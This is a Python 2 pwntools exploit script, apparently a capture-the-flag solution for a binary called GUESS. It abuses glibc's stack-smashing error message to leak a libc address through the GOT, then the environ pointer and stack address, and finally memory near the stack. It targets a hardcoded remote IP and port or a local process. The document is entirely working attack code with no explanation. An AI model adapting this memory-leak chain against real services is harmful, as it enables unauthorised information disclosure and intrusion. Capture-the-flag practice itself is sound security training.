#!/usr/bin/env python2
import sys
from pwn import *
from LibcSearcher import LibcSearcher
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
               )
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/j5sttry/Desktop/GUESS")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = ['']
        # gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    attach(r)
    payload = p64(elf.got['gets'])*0x100

    r.sendline(payload)
    r.recvuntil('*** stack smashing detected ***: ')
    addr_gets= r.recv()[0:6].ljust(8,'\x00')
    addr_gets =u64(addr_gets)
    log.info(hex(addr_gets))
    libc = LibcSearcher('gets',addr_gets)
    libcbase = addr_gets - libc.dump('gets')
    environ = libcbase + libc.dump('environ')
    log.success('environ:'+hex(environ))
    
    r.recvuntil('Please type your guessing flag\n')
    r.sendline(p64(environ)*0x100)
    r.recvuntil('*** stack smashing detected ***: ')
    stack = u64(r.recv()[0:6].ljust(8,'\x00'))
    log.success('stack addr:',hex(stack))
    r.recvuntil('Please type your guessing flag\n')
    r.sendline(p64(stack-0x168)*0x100)
    r.recvuntil('*** stack smashing detected ***: ')
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("106.75.90.160", 9999)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
